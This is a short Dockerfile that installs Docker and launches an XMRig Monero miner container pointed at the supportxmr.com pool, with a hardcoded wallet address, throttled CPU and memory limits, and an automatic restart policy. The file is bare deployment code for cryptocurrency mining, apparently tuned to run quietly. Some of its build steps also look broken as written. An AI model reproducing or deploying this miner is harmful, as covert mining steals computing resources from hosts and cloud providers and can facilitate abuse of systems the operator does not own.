FROM ubuntu:16.04
RUN apt-get update 
RUN apt-get install docker.io 
RUN systemctl start docker 
RUN systemctl enable docker 
RUN docker run --restart unless-stopped --read-only -it --cpus=".1" -m 50M -c 512 bitnn/alpine-xmrig -o pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x -k 
